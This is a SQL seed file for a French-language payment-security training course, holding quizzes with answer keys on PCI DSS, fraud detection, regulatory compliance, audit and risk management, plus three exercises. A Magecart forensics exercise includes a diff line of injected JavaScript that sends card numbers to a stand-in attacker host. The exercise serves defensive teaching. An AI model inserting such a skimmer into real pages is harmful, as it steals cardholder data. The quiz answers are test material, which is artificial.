-- BLOC 4 – Quizzes and Exercises (Expanded – 10 questions per quiz)

-- Quiz 4.1 – PCI DSS
INSERT INTO learning.cursus_quizzes (id, module_id, title, questions, passing_score)
VALUES ('quiz-4.1-pcidss', 'mod-4.1-pcidss', 'Quiz – PCI DSS v4.0.1',
'[
  {"id":"q1","question":"Combien d''exigences principales contient PCI DSS ?","options":["6","10","12","15"],"correct":2,"explanation":"PCI DSS contient 12 exigences principales regroupées en 6 domaines."},
  {"id":"q2","question":"Vrai/Faux : Il est permis de stocker le CVV2 si celui-ci est chiffré.","options":["Vrai","Faux"],"correct":1,"explanation":"Faux : les SAD (CVV, PIN, Track) ne doivent JAMAIS être stockées après autorisation, même chiffrées."},
  {"id":"q3","question":"Qu''est-ce que l''approche personnalisée de PCI DSS v4.0 ?","options":["Utiliser son propre questionnaire","Définir ses propres objectifs de sécurité","Atteindre l''objectif de sécurité de l''exigence avec un contrôle non prescriptif","Ignorer les exigences non applicables"],"correct":2,"explanation":"L''approche personnalisée permet d''utiliser des contrôles alternatifs tant que l''objectif de sécurité est atteint."},
  {"id":"q4","question":"Quel SAQ est le plus réduit ?","options":["SAQ A","SAQ B","SAQ D","SAQ P2PE"],"correct":3,"explanation":"SAQ P2PE (~35 questions) est le plus réduit grâce à la solution P2PE validée."},
  {"id":"q5","question":"L''exigence 6.4.3 impose :","options":["Le chiffrement des bases","L''inventaire des scripts JS sur les pages de paiement","La sauvegarde quotidienne","Le MFA pour les admins"],"correct":1,"explanation":"6.4.3 = inventaire et vérification d''intégrité (SRI) de tous les scripts sur les pages de paiement."},
  {"id":"q6","question":"L''exigence 8.3.6 de PCI DSS v4.0 impose :","options":["Des mots de passe de 8 caractères","Des mots de passe de 12 caractères minimum","L''authentification biométrique","Des clés SSH"],"correct":1,"explanation":"PCI DSS v4.0 exigence 8.3.6 impose un minimum de 12 caractères pour les mots de passe (contre 7 dans la v3.2.1)."},
  {"id":"q7","question":"Qu''est-ce qu''un ASV ?","options":["Application Security Validator","Approved Scanning Vendor","Automated Security Verification","Account Security Verifier"],"correct":1,"explanation":"ASV = Approved Scanning Vendor, prestataire approuvé par le PCI SSC pour réaliser les scans de vulnérabilité externes."},
  {"id":"q8","question":"L''exigence 11.6.1 impose :","options":["Un test de pénétration annuel","La détection de modifications non autorisées sur les pages de paiement","Un scan mensuel","La formation des développeurs"],"correct":1,"explanation":"11.6.1 impose un mécanisme de détection de changements (tamper detection) sur les pages de paiement HTTP headers et scripts."},
  {"id":"q9","question":"La segmentation réseau en PCI DSS permet de :","options":["Accélérer les transactions","Réduire le périmètre PCI (CDE) et donc le coût de conformité","Éliminer le besoin de chiffrement","Supprimer le besoin d''audit"],"correct":1,"explanation":"La segmentation isole le CDE du reste du réseau, réduisant le nombre de systèmes à auditer et sécuriser."},
  {"id":"q10","question":"Que se passe-t-il en cas de non-conformité PCI DSS ?","options":["Rien","Amendes des schémas + risque de perte du droit d''accepter les cartes","Procès automatique","Fermeture de l''entreprise"],"correct":1,"explanation":"Les schémas (Visa/MC) peuvent imposer des amendes allant de 5 000 à 100 000 $/mois, et l''acquéreur peut résilier le contrat du commerçant."}
]''::jsonb, 60) ON CONFLICT (id) DO NOTHING;

-- Quiz 4.2 – Anti-fraude
INSERT INTO learning.cursus_quizzes (id, module_id, title, questions, passing_score)
VALUES ('quiz-4.2-antifraude', 'mod-4.2-antifraude', 'Quiz – Détection de fraude',
'[
  {"id":"q1","question":"Quel type de fraude représente 70% de la fraude carte en France ?","options":["Skimming","CNP (Card Not Present)","Account takeover","Blanchiment"],"correct":1,"explanation":"La fraude CNP (paiements en ligne) représente environ 70% de la fraude carte en France."},
  {"id":"q2","question":"Vrai/Faux : Un autoencoder est un modèle supervisé.","options":["Vrai","Faux"],"correct":1,"explanation":"Faux : l''autoencoder est non supervisé, il apprend la distribution normale et détecte les anomalies."},
  {"id":"q3","question":"Que mesure l''AUC de la courbe ROC ?","options":["Le montant de fraude","La performance globale du modèle de scoring","Le temps de réponse","Le coût de la fraude"],"correct":1,"explanation":"AUC (Area Under Curve) mesure la capacité du modèle à distinguer fraude vs légitime. AUC > 0.95 = excellent."},
  {"id":"q4","question":"Un bot de test de cartes se caractérise par :","options":["Des montants élevés","Une vélocité extrême + montant fixe + taux de refus élevé","Des transactions internationales","Un seul commerçant"],"correct":1,"explanation":"500 TX de 1€ en 2 min, 80% de refus = bot testant des cartes volées."},
  {"id":"q5","question":"Quel KPI anti-fraude mesure les légitimes bloquées à tort ?","options":["TPR","FPR","AUC","Précision"],"correct":1,"explanation":"FPR = False Positive Rate = transactions légitimes bloquées / transactions légitimes totales. Objectif < 2%."},
  {"id":"q6","question":"La vélocité en anti-fraude mesure :","options":["La vitesse du réseau","Le nombre de transactions d''une carte sur une période courte","La taille du panier moyen","Le score du modèle"],"correct":1,"explanation":"La vélocité = fréquence de transactions d''un même PAN/device/IP sur une fenêtre temporelle. Vélocité élevée = signal de fraude."},
  {"id":"q7","question":"Qu''est-ce que le device fingerprinting ?","options":["L''empreinte digitale sur le téléphone","L''identification unique d''un appareil par ses caractéristiques techniques","Un type de biométrie","Un certificat SSL"],"correct":1,"explanation":"Le device fingerprinting crée un identifiant unique basé sur le navigateur, OS, résolution, plugins, timezone, etc. pour suivre un appareil entre sessions."},
  {"id":"q8","question":"Le 3DS2 utilise quelles données pour l''analyse de risque frictionless ?","options":["Uniquement le montant","Plus de 100 data elements (device, historique, géolocalisation...)","Uniquement le PAN","Le CVV et le PIN"],"correct":1,"explanation":"3DS2 transmet 100+ data elements à l''ACS : device info, browser info, historique de transactions, shipping address, etc."},
  {"id":"q9","question":"Qu''est-ce que le friendly fraud ?","options":["Fraude commise par un ami","Le porteur reçoit le produit puis conteste la transaction","Fraude avec une carte amicale","Un type de phishing"],"correct":1,"explanation":"Friendly fraud = le porteur légitime reçoit le bien/service puis demande un chargeback injustifié (fausse déclaration de fraude)."},
  {"id":"q10","question":"La règle ''amount splitting'' détecte :","options":["Des montants trop élevés","La division d''un montant en petites transactions pour contourner les seuils","Des erreurs de conversion","Des doublons"],"correct":1,"explanation":"Amount splitting = diviser un achat de 800€ en 3x 266€ pour éviter le seuil SCA ou le seuil de review anti-fraude."}
]''::jsonb, 60) ON CONFLICT (id) DO NOTHING;

-- Quiz 4.3 – Conformité
INSERT INTO learning.cursus_quizzes (id, module_id, title, questions, passing_score)
VALUES ('quiz-4.3-conformite', 'mod-4.3-conformite', 'Quiz – DSP2, RGPD, LCB-FT',
'[
  {"id":"q1","question":"Qu''est-ce qu''un PISP ?","options":["Processeur de paiement","Prestataire d''initiation de paiement","Protocole de sécurité","Programme d''intégration"],"correct":1,"explanation":"PISP = Payment Initiation Service Provider, initie des paiements depuis le compte du client (Open Banking)."},
  {"id":"q2","question":"Le RGPD impose une notification à la CNIL sous :","options":["24h","48h","72h","1 semaine"],"correct":2,"explanation":"72 heures après la découverte d''une violation de données personnelles."},
  {"id":"q3","question":"Qu''est-ce qu''un PEP en LCB-FT ?","options":["Protection Environnement Paiement","Personne Politiquement Exposée","Protocole Échange Paiement","Profil Établissement Partenaire"],"correct":1,"explanation":"PEP = Personne Politiquement Exposée, individu avec fonctions politiques = vigilance renforcée obligatoire."},
  {"id":"q4","question":"DORA s''applique depuis :","options":["2020","2023","Janvier 2025","2027"],"correct":2,"explanation":"DORA (Digital Operational Resilience Act) est en application depuis janvier 2025."},
  {"id":"q5","question":"La DSP2 impose l''ouverture de quelles APIs ?","options":["APIs de trading","APIs d''accès aux comptes (XS2A)","APIs de crédit","APIs internes"],"correct":1,"explanation":"XS2A = Access to Accounts : consultation, initiation de paiement, confirmation de fonds."},
  {"id":"q6","question":"Qu''est-ce que l''AISP dans l''Open Banking ?","options":["Un protocole de sécurité","Account Information Service Provider – agrégateur de comptes","Un type d''API","Un format de message"],"correct":1,"explanation":"AISP = Account Information Service Provider, accède aux informations de compte avec le consentement du client (Bankin'', Linxo)."},
  {"id":"q7","question":"Le KYC (Know Your Customer) implique :","options":["Connaître le code postal du client","Vérifier l''identité du client, son adresse et la source de fonds","Connaître sa carte de fidélité","Vérifier uniquement son email"],"correct":1,"explanation":"KYC = vérification de l''identité (pièce d''identité), de l''adresse (justificatif), et de la source des fonds pour lutter contre le blanchiment."},
  {"id":"q8","question":"Le seuil de déclaration de soupçon Tracfin est :","options":["1 000 €","5 000 €","Aucun montant fixe – toute opération suspecte","50 000 €"],"correct":2,"explanation":"Il n''y a pas de seuil de montant : toute opération suspecte, quel que soit le montant, doit être déclarée à Tracfin."},
  {"id":"q9","question":"DORA impose quoi aux entités financières ?","options":["Uniquement un antivirus","Des tests de résilience opérationnelle numérique (TLPT) et une gestion des risques ICT","Uniquement un PCA papier","Des audits annuels PCI"],"correct":1,"explanation":"DORA impose un framework complet de résilience numérique : gestion des risques ICT, tests de pénétration (TLPT), gestion des tiers, reporting d''incidents."},
  {"id":"q10","question":"Le droit à la portabilité (RGPD) permet au client :","options":["De changer de banque instantanément","De récupérer ses données dans un format structuré et lisible par machine","De supprimer son compte immédiatement","D''accéder aux données d''autres clients"],"correct":1,"explanation":"Le droit à la portabilité (Art. 20 RGPD) permet de recevoir ses données dans un format structuré, couramment utilisé et lisible par machine."}
]''::jsonb, 60) ON CONFLICT (id) DO NOTHING;

-- Quiz 4.4 – Audit
INSERT INTO learning.cursus_quizzes (id, module_id, title, questions, passing_score)
VALUES ('quiz-4.4-audit', 'mod-4.4-audit', 'Quiz – Audit & Réponse à incident',
'[
  {"id":"q1","question":"Qu''est-ce qu''un QSA ?","options":["Questionnaire de sécurité","Auditeur certifié PCI SSC","Logiciel de scan","Protocole de test"],"correct":1,"explanation":"QSA = Qualified Security Assessor, auditeur certifié par le PCI SSC pour réaliser les audits PCI DSS."},
  {"id":"q2","question":"Quel outil est utilisé pour intercepter les requêtes HTTP lors d''un pentest web ?","options":["Wireshark","Burp Suite","Nmap","Volatility"],"correct":1,"explanation":"Burp Suite = proxy HTTP/HTTPS pour intercepter, modifier et rejouer les requêtes web."},
  {"id":"q3","question":"Quel est le temps moyen de détection d''une breach selon IBM (2024) ?","options":["24h","30 jours","197 jours","1 an"],"correct":2,"explanation":"197 jours en moyenne pour détecter une breach (IBM Cost of a Data Breach 2024)."},
  {"id":"q4","question":"Les 6 phases NIST de réponse à incident commencent par :","options":["Identification","Préparation","Containment","Notification"],"correct":1,"explanation":"Préparation est la première phase : formation, outils, procédures, contacts avant tout incident."},
  {"id":"q5","question":"Qu''est-ce qu''une attaque Magecart ?","options":["DDoS sur un switch","Injection JS malveillant sur des pages de paiement","Phishing par email","Brute force sur les PIN"],"correct":1,"explanation":"Magecart = injection de JavaScript sur les pages checkout pour voler les données de carte en temps réel."},
  {"id":"q6","question":"Nmap est principalement utilisé pour :","options":["Intercepter le trafic","Découvrir les ports ouverts et services actifs sur un réseau","Analyser les malwares","Déchiffrer des mots de passe"],"correct":1,"explanation":"Nmap = scanner réseau pour découvrir les hôtes, les ports ouverts, les services et leurs versions."},
  {"id":"q7","question":"Qu''est-ce qu''un IOC (Indicator of Compromise) ?","options":["Un indicateur de performance","Un artefact observable indiquant une compromission (IP, hash, domaine)","Un code de réponse","Un type de log"],"correct":1,"explanation":"IOC = artefact technique observable : adresse IP malveillante, hash de malware, domaine C2, signature de fichier suspect."},
  {"id":"q8","question":"La commande PCI DSS 11.4 impose :","options":["Des scans mensuels","Des tests de pénétration internes et externes au moins annuels","Un audit de code hebdomadaire","La formation des utilisateurs"],"correct":1,"explanation":"L''exigence 11.4 impose des pentests internes et externes au moins annuels et après tout changement significatif."},
  {"id":"q9","question":"Le containment lors d''un incident consiste à :","options":["Notifier les médias","Isoler les systèmes compromis pour empêcher la propagation","Supprimer tous les logs","Redémarrer tous les serveurs"],"correct":1,"explanation":"Containment = isoler les systèmes compromis (déconnecter du réseau, bloquer les IP malveillantes) tout en préservant les preuves forensiques."},
  {"id":"q10","question":"Qu''est-ce que le CVSS ?","options":["Un protocole de chiffrement","Common Vulnerability Scoring System – score de sévérité des vulnérabilités","Un type de certificat","Un standard de carte"],"correct":1,"explanation":"CVSS note les vulnérabilités de 0 à 10 selon leur exploitabilité et leur impact. Score ≥ 9.0 = critique."}
]''::jsonb, 60) ON CONFLICT (id) DO NOTHING;

-- Quiz 4.5 – Risques
INSERT INTO learning.cursus_quizzes (id, module_id, title, questions, passing_score)
VALUES ('quiz-4.5-risques', 'mod-4.5-risques', 'Quiz – Gestion des risques',
'[
  {"id":"q1","question":"Combien d''ateliers comporte EBIOS RM ?","options":["3","4","5","6"],"correct":2,"explanation":"EBIOS RM comporte 5 ateliers : cadrage, sources de risques, scénarios stratégiques, opérationnels, traitement."},
  {"id":"q2","question":"Les 4 traitements du risque sont :","options":["Accepter, réduire, transférer, éviter","Identifier, analyser, évaluer, traiter","Prévenir, détecter, corriger, améliorer","Planifier, faire, vérifier, agir"],"correct":0,"explanation":"Accepter (le risque), Réduire (contrôles), Transférer (assurance), Éviter (supprimer l''activité)."},
  {"id":"q3","question":"Qu''est-ce qu''un KRI ?","options":["Key Risk Indicator","Key Response Initiative","Knowledge Resource Index","Known Risk Intelligence"],"correct":0,"explanation":"KRI = Key Risk Indicator, indicateur clé de suivi du risque (taux de fraude, MTTR, conformité)."},
  {"id":"q4","question":"La formule du risque est :","options":["Risque = menace × vulnérabilité","Risque = probabilité × impact","Risque = coût × temps","Risque = fréquence × sévérité"],"correct":1,"explanation":"Risque = probabilité d''occurrence × impact en cas de réalisation."},
  {"id":"q5","question":"Un risque critique est :","options":["Toujours acceptable","Jamais acceptable","Acceptable si documenté","Acceptable après assurance"],"correct":1,"explanation":"Risque critique = jamais acceptable, réduction obligatoire immédiate."},
  {"id":"q6","question":"ISO 27005 est un standard de :","options":["Chiffrement","Gestion des risques liés à la sécurité de l''information","Tests de pénétration","Développement logiciel"],"correct":1,"explanation":"ISO 27005 fournit les guidelines pour la gestion des risques de sécurité de l''information, alignée avec ISO 27001."},
  {"id":"q7","question":"Le MTTR (Mean Time To Repair) mesure :","options":["Le temps entre deux pannes","Le temps moyen pour résoudre un incident","Le temps de disponibilité","Le temps de backup"],"correct":1,"explanation":"MTTR = temps moyen entre la détection d''un incident et sa résolution complète. Objectif : minimiser ce temps."},
  {"id":"q8","question":"Qu''est-ce que l''appétit au risque (risk appetite) ?","options":["Le goût pour la prise de risque","Le niveau de risque qu''une organisation est prête à accepter pour atteindre ses objectifs","Le coût maximum d''un incident","Le nombre de vulnérabilités acceptées"],"correct":1,"explanation":"L''appétit au risque est défini par la direction et guide toutes les décisions de gestion des risques de l''organisation."},
  {"id":"q9","question":"Le plan de continuité d''activité (PCA) doit être testé :","options":["Jamais","Au moins annuellement","Uniquement après un incident","Tous les 5 ans"],"correct":1,"explanation":"Le PCA doit être testé au minimum annuellement (exercices de simulation, bascule de site) et après tout changement majeur."},
  {"id":"q10","question":"La cartographie des risques représente :","options":["La géographie des serveurs","Un graphique croisant probabilité et impact pour chaque risque identifié","La liste des employés","L''architecture réseau"],"correct":1,"explanation":"La cartographie (ou matrice) des risques positionne chaque risque selon sa probabilité (axe X) et son impact (axe Y) pour prioriser les traitements."}
]''::jsonb, 60) ON CONFLICT (id) DO NOTHING;

-- =============================================================================
-- EXERCISES (unchanged)
-- =============================================================================

INSERT INTO learning.cursus_exercises (id, module_id, title, description, difficulty, exercise_type, instructions, expected_output, hints)
VALUES
('ex-4.1-perimetre', 'mod-4.1-pcidss', 'Définition du périmètre PCI DSS',
'À partir d''un schéma d''architecture, identifiez le CDE et proposez une segmentation.',
'3',
'analysis',
jsonb_build_array($$Architecture d'un commerçant e-commerce :

- **Serveur Web** : page de checkout (collecte PAN)
- **API Backend** : traite la commande, envoie au PSP
- **Base de données** : stocke commandes + PAN chiffré
- **ERP** : gestion des stocks (accès en lecture à la DB)
- **WiFi bureautique** : postes des employés
- **DMZ** : reverse proxy + WAF

Questions :
1. Quels composants sont dans le CDE ?
2. L'ERP est-il dans le périmètre ?
3. Proposez une segmentation réseau
4. Quel SAQ est applicable ?$$),
$$Réponses :

1. **CDE** : Serveur Web + API Backend + Base de données (tous traitent ou stockent le PAN)
2. **ERP** : OUI s'il a accès à la DB contenant les PAN → solution = segmenter ou tokeniser les PAN avant accès ERP
3. **Segmentation** : DMZ (Web) → pare-feu → VLAN CDE (API + DB) → pare-feu → Réseau bureautique (ERP, WiFi)
4. **SAQ D** sauf si le commerçant externalise le traitement du PAN au PSP (iframe/redirect → SAQ A)$$,
'["Le CDE inclut tous les systèmes qui touchent aux données de carte","Un système connecté au CDE est dans le périmètre (sauf segmentation)","La tokenisation peut sortir l''ERP du périmètre","SAQ A = le plus simple si le PAN ne transite jamais par les serveurs du commerçant"]'::jsonb
),

('ex-4.2-scoring', 'mod-4.2-antifraude', 'Conception d''un moteur de scoring',
'Concevez les règles d''un moteur de scoring anti-fraude pour un commerçant en ligne.',
'4',
'practical',
jsonb_build_array($$Contexte : Commerçant vendant de l'électronique en ligne (panier moyen 350 €).

Profil de fraude :
- 60% des fraudes = CNP avec cartes volées
- 25% = account takeover
- 15% = friendly fraud

Concevoir :
1. **10 règles** avec seuils et scores
2. Le **seuil de décision** (accepter/review/refuser)
3. Les **features ML** à intégrer (minimum 8)
4. Le processus de **review manuel** (checklist)$$),
$$Exemple de scoring :

| # | Règle | Score |
|---|-------|-------|
| 1 | Nouveau client + montant > 500 € | +35 |
| 2 | Adresse de livraison ≠ adresse de facturation | +15 |
| 3 | IP étrangère + carte France | +25 |
| 4 | > 2 transactions en 10 min | +30 |
| 5 | Device jamais vu | +20 |
| 6 | Email jetable | +25 |
| 7 | Catégorie à risque (smartphones) | +10 |
| 8 | Heure nocturne (2h-6h) | +10 |
| 9 | Montant exact (pas de centimes) | +5 |
| 10 | Même PAN, adresses de livraison multiples en 24h | +40 |

Seuils : < 30 = accepter, 30-65 = review, > 65 = refuser

Features ML : montant relatif, heure, distance géo, fréquence 1h/24h/7j, device age, email age, shipping vs billing distance, session duration$$,
'["Adapter les règles au profil de fraude spécifique du commerçant","Les seuils doivent être calibrés sur les données historiques","Le review manuel doit vérifier : identité, cohérence, historique","Les features ML doivent être calculables en temps réel"]'::jsonb
),

('ex-4.4-forensics', 'mod-4.4-audit', 'Investigation d''un incident Magecart',
'Analysez les artefacts d''un incident Magecart et reconstituez la timeline.',
'4',
'analysis',
jsonb_build_array($$Artefacts fournis :

**Log serveur web (Apache) :**
```
[2026-01-15 03:22:14] 83.42.x.x PUT /checkout.js 200
[2026-01-15 03:22:15] 83.42.x.x PUT /checkout.js.map 200
```

**Différence du fichier checkout.js :**
```diff
+var img = new Image();
+img.src="https://evil.example.com/collect?d="+btoa(document.querySelector('[name=cc]').value);
```

**Alerte Visa (reçue 2026-02-10) :**
"Compromis probable – 847 cartes signalées frauduleuses, point commun : votre site."

Questions :
1. Reconstituez la timeline complète
2. Identifiez le vecteur d'attaque probable
3. Quelles notifications sont obligatoires et dans quels délais ?
4. Quelles mesures de containment immédiates ?
5. Quelle exigence PCI DSS v4.0.1 aurait pu prévenir ?$$),
$$Timeline :
- J-26 (15/01 03h22) : Modification malveillante de checkout.js depuis IP 83.42.x.x
- J-26 à J0 : Exfiltration silencieuse des données de carte (847+ cartes)
- J0 (10/02) : Alerte Visa, détection
- J+1 : Containment (retrait script, restauration, isolation serveur)
- J+2 : Début forensics
- J+3 : Notification CNIL

Vecteur : Accès FTP/SSH compromis ou CMS non patché → upload du script malveillant

Notifications : CNIL (72h), schémas (immédiat), acquéreur (immédiat), clients (sans délai)

Containment : retirer le script, bloquer l'IP, changer les credentials, scanner la totalité du serveur

Exigence PCI : 6.4.3 (inventaire et SRI des scripts) + 11.6.1 (détection de modifications)$$,
'["Le PUT sur checkout.js est le point d''entrée de l''attaque","btoa() encode en base64 les données de carte pour exfiltration","L''exigence 6.4.3 impose SRI (hash) pour détecter la modification","Les notifications CNIL/schémas/acquéreur sont toutes obligatoires"]'::jsonb
) ON CONFLICT (id) DO NOTHING;
